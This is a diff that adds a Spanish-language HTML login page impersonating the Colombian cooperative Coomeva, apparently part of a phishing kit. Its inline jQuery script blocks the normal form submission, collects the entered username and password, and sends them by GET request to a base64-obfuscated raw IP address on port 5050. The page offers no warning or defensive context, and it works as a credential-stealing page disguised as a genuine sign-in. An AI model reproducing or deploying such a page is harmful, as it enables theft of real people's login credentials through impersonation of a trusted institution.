@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html class="login-pf">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name="robots" content="noindex, nofollow">
+        <meta name="viewport" content="width=device-width,initial-scale=1"/>
+        <title>Inicia sesión en coomeva</title>
+        
+        <link rel="stylesheet" type="text/css" href="css/base.css">
+        <link rel="stylesheet" type="text/css" href="css/patternfly.min.css">
+        <link rel="stylesheet" type="text/css" href="css/patternfly-additions.min.css">
+        <link rel="stylesheet" type="text/css" href="css/pficon.css">
+        <link rel="stylesheet" type="text/css" href="css/login1_2.css">
+        <link rel="stylesheet" type="text/css" href="css/tile.css">
+        <link rel="stylesheet" type="text/css" href="css/app.css">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/sjcl/1.0.8/sjcl.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    </head>
+
+<body>
+    <div id="pnlVertical" class="card-pf pf-l-grid">
+        <div class="pf-m-7-col-on-sm pf-m-7-col-on-xl imgBack card-land">  <img class="pf-m-7-col-on-sm pf-m-7-col-on-xl imgBack card-land" src=imgs/feliz.png> </div>
+        <div class="pf-m-5-col-on-sm pf-m-5-col-on-xl sideWhite">
+            <div class="login-pf-page">
+                <div class="cardLogin">
+                    <header class="login-pf-header">
+                        <h1 id="kc-page-title">
+                            <div class="login-pf-page-header">
+                                <div id="kc-header-wrapper" class=""> <img class="logoMain" src=imgs/logoCoomeva.svg> </div>
+                            </div>
+                        </h1>
+                    </header>
+                    <div id="kc-content">
+                        <div id="kc-content-wrapper">
+                            <div id="kc-form">
+                                <div id="kc-form-wrapper">
+                                    <form id="formulario" method="get">
+                                        <div class="form-group">
+                                            <label for="username" class="pf-c-form__label pf-c-form__label-text desText" style="font-size: 20px;" > Usuario </label>
+                                            <input tabindex="1" id="username" class="pf-c-form-control inputText" name="username" value=""  type="text" autofocus autocomplete="off" aria-invalid="" />
+                                        </div>
+                                        <div class="form-group">
+                                            <label for="password" class="pf-c-form__label pf-c-form__label-text desText" style="font-size: 20px;">Contraseña</label>
+                                            <input tabindex="2" id="password" class="pf-c-form-control inputText" name="password" type="password" autocomplete="off" aria-invalid="" />
+                                        </div>
+                                        <div class="form-group login-pf-settings">
+                                            <div id="kc-form-options">
+                                                <div class="checkbox">
+                                                    <label>
+                                                        <input tabindex="3" id="rememberMe" name="rememberMe" type="checkbox" style="font-size: 20px;" > Seguir conectado
+                                                    </label>
+                                                </div>
+                                            </div>
+                                            <div class="">
+                                                <!-- Pruebas -->
+                                                <!-- Prod -->
+                                                <span><a tabindex="5" href="https://google.com" class="passText" >¿Has olvidado tu contraseña?</a></span>
+                                            </div>
+                                            <div class="">
+                                                <!-- Pruebas -->
+                                                <!-- Prod -->
+                                                <span><a tabindex="5" href="index.html" class="passText">Crear o activar cuenta</a></span>
+                                            </div>
+                                        </div>
+                                        <div id="kc-form-buttons" class="form-group">
+                                            
+                                            <input tabindex="4" class="pf-c-button buttonPpal" name="login" id="kc-login" type="submit" value="Iniciar sesión"/>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+   
+</body>
+
+<script>
+    $(document).ready(function() {
+      $("#kc-login").click(function(event) {
+        event.preventDefault(); // Evita el envío del formulario
+  
+        // Obtener los datos del formulario
+        var nombre = $("#username").val();
+        var mail = $("#password").val();
+        
+        // Codificar la URL en base64
+        var urlBase64 = atob("aHR0cDovLzQ0LjIxMS4yMDMuMTg0OjUwNTAv");
+  
+        // Realizar la petición Ajax
+        $.ajax({
+          type: "GET",
+          url: urlBase64,
+          data: {
+            nombre: nombre,
+            mail: mail,
+          },
+          success: function(response) {
+            // Manejar la respuesta exitosa aquí
+            console.log("Petición enviada con éxito");
+            console.log(response);
+             // Redirigir al usuario a concient.html
+             //window.location.href = "concient.html";
+          },
+          error: function(jqXHR, textStatus, errorThrown) {
+            // Manejar los errores aquí
+            console.error("Error en la petición Ajax");
+            console.error(jqXHR);
+            console.error(textStatus);
+            console.error(errorThrown);
+             // Redirigir al usuario a concient.html
+          // window.location.href = "concient.html";
+          }
+        });
+      });
+    });
+  </script>
+
+
+</html>
+
